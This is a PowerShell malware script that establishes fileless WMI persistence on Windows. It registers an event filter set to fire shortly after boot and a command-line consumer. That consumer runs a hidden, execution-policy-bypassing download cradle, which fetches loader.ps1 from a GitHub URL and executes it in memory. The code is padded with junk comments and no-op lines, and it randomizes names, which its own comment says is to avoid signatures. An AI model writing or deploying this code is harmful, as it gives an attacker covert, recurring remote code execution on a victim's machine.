$ErrorActionPreference = "SilentlyContinue"

# === Fileless WMI Persistence ===
# Strategy: 
# smcTDgNDLEPgkRBMweORQmwybhUUzs
# 1. Do NOT drop binary to disk.
$null = Get-Date -Format "VZJd"
# 2. Register WMI Event to trigger on system uptime (delayed start).
# 3. Consumer executes the PowerShell Cradle to download loader.ps1.
# gWIKKjwIcvGCbrSWLfKSqpYMipSGVo

$dYhhgQHHtCATSQE = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/loader.ps1"
# Hardened Cradle (Hidden, Bypass, No Profile)
# We use a randomized variable for IEX to avoid simple signatures
# iutspRnxiZLqUKpSvDrzDlGywzrIOq
$TvGKxITAxKAg = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$dYhhgQHHtCATSQE')"""

# 2. Randomization
# esqndKDwohkBidNcjZYjBuxHExySZg
$XsGWqkLpZKHX = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
$KLHeQwHvaQUKeicW = ""
1..10 | ForEach-Object { $KLHeQwHvaQUKeicW += $XsGWqkLpZKHX[(Get-Random -Maximum $XsGWqkLpZKHX.Length)] }

# 3. Clean Old Persistence (if matches our pattern, optional)
Get-WmiObject __EventFilter -Namespace "root\subscription" | Where-Object { $_.Name -match "SysX" } | Remove-WmiObject

$null = Get-Date -Format "PFTn"
# 3. Create Trigger (Filter)
# SzdCxBRarDUofAmQegkJuimBYnCDXc
# Trigger: 5 minutes after boot (Uptime > 300s & < 400s)
# Optimized to run only ONCE per boot cycle
$YxtrAJsRoSpwizF = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"
$null = Get-Date -Format "OLdc"

$viPQxxzYIM = @{
$null = Get-Date -Format "rVCd"
    Name           = $KLHeQwHvaQUKeicW
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
# xUbsoLSDxqDGXXoSCfAgcBApViJHbN
    Query          = $YxtrAJsRoSpwizF
# qDdyaaBwxrgBuhqVelpKfWNKsrSogi
}
$VAEAhPEYeTdAupnWkt = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $viPQxxzYIM

# 4. Create Action (Consumer)
$umGvesjmjHU = @{
    Name                = $KLHeQwHvaQUKeicW
    CommandLineTemplate = $TvGKxITAxKAg
    RunInteractively    = $false
}
$YwTvniDrCiFsjMF = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $umGvesjmjHU
# PknejPvNYfpUAFAuJwmODKAhbcBXbf

# 5. Bind
$gRilssGfGyIlkwJgy = @{
    Filter   = $VAEAhPEYeTdAupnWkt
# NuaioWxItxecfHVaButPVIxsjlDDSO
    Consumer = $YwTvniDrCiFsjMF
# HZpgqLVSeczQcBqWDgNROpejMkHIfb
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $gRilssGfGyIlkwJgy
# JnATPQYRZeuLdVcCmSkZvHgznlcrbZ

# TmDxDmZEfAHDIGbUsJDhnLrzSfEkgy
Write-Host "[+] Fileless WMI Persistence Established" -ForegroundColor Green

$null = Get-Date -Format "rbpv"

$null = Get-Date -Format "cyjz"